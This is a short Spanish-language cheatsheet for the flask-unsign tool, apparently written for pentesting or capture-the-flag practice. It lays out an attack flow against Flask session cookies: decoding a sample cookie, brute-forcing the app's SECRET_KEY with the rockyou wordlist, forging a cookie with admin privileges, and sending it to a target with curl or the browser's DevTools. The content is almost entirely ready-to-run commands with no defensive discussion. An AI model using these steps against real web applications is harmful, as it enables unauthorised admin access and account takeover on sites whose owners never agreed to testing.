# flask-unsign — cheatsheet
> Cookies de sesión Flask (no JWT)

## Instalación
```bash
pip install flask-unsign --break-system-packages
```

## Flujo de ataque

### 1. Decodificar cookie (ver contenido)
```bash
flask-unsign --decode --cookie 'eyJsb2...'
```

### 2. Crackear SECRET_KEY
### Ver solo que datos hay
```bash
flask-unsign --unsign --cookie '.eJwty0sKgCAQANC7zFoifyleJoacRPCH2iq6ey3aPng3pBoCeXBwYhoEDOps-6Cj0_zQWi5-mzHTmJgbOG6sUMpIzRerN71KzeAa1Atm-hL6HAs8L0ZAHGA.aj389w.i2RHzfDxdBh6YsqXzVH50rsL-6s'
```
### Ver que hay y crakiar el secret
```bash
flask-unsign --unsign --cookie '.eJwty0sKgCAQANC7zFoifyleJoacRPCH2iq6ey3aPng3pBoCeXBwYhoEDOps-6Cj0_zQWi5-mzHTmJgbOG6sUMpIzRerN71KzeAa1Atm-hL6HAs8L0ZAHGA.aj389w.i2RHzfDxdBh6YsqXzVH50rsL-6s' \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --no-literal-eval
```

### Forjar cookie como admin
```bash
flask-unsign --sign \
  --cookie "{'username': 'admin', 'logged': 'true'}" \
  --secret 'SECRET_ENCONTRADA'
```

### Usar la cookie forjada
```bash
# Con curl
curl -H "Cookie: session=COOKIE_FORJADA" http://target/

# O en DevTools → Application → Cookies → editar valor
```